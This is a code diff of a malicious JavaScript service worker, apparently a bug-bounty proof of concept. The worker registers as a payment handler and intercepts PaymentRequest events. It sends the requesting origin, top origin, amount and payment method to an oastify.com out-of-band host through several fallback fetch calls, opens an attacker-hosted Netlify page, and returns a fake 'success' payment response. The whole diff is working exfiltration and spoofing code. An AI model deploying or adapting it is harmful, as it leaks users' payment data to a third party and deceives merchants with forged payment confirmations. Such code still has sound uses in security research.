@@ -1,4 +1,4 @@
-  const OOB = 'https://n6u4chbqezxncoq47ydz4ge9q0wrkh86.oastify.com';
+const OOB = 'https://ua8bgofxi61ugvubb5h68nigu70yopce.oastify.com';
 
   self.addEventListener("install", e => {
     self.skipWaiting();
@@ -13,34 +13,33 @@
   self.addEventListener("activate", e => e.waitUntil(clients.claim()));
 
   self.addEventListener("paymentrequest", e => {
-    // These tell us WHERE the PaymentRequest was initiated from
-    const origin = e.paymentRequestOrigin;  // e.g. "https://www.figma.com"
-    const top    = e.topOrigin;             // top-level frame origin
-    const total  = JSON.stringify(e.total);
-    const method = e.methodName;
+    const data = {
+      origin: e.paymentRequestOrigin,
+      top:    e.topOrigin,
+      total:  JSON.stringify(e.total),
+      method: e.methodName
+    };
 
-    // Exfil immediately — no window needed
-    fetch(OOB + '/payment?origin=' + encodeURIComponent(origin) +
-                '&top='    + encodeURIComponent(top) +
-                '&total='  + encodeURIComponent(total),
-          { mode: 'no-cors' });
+    // 3 exfil methods — at least one will land
+    fetch('https://' + OOB.split('//')[1] + '/sw_payment?' +
+      new URLSearchParams(data).toString(), { mode: 'no-cors' });
 
-    // Open handler window so we can also run JS in that context
+    new self.clients.matchAll().then(list =>
+      list.forEach(c => c.postMessage({type: 'sw_fired', data}))
+    );
+
     e.respondWith(
       e.openWindow('https://gleeful-creponne-8ff162.netlify.app/pay-handler.html')
         .then(client => {
-          // client = WindowClient of the opened page
-          // We can postMessage to it with figma context data
-          if (client) {
-            client.postMessage({
-              type: 'payment_context',
-              paymentRequestOrigin: origin,
-              topOrigin: top,
-              total: total
-            });
-          }
-          // Must resolve with a payment response object
-          return { methodName: method, details: { status: 'success' } };
+          if (client) client.postMessage({type: 'ctx', ...data});
+          return { methodName: e.methodName, details: { status: 'success' } };
+        })
+        .catch(err => {
+          // openWindow failed — still exfil
+          fetch('https://' + OOB.split('//')[1] + '/sw_openwin_fail?e=' +
+            encodeURIComponent(err.message) + '&' + new URLSearchParams(data).toString(),
+            { mode: 'no-cors' });
+          return { methodName: e.methodName, details: { status: 'success' } };
         })
     );
   });
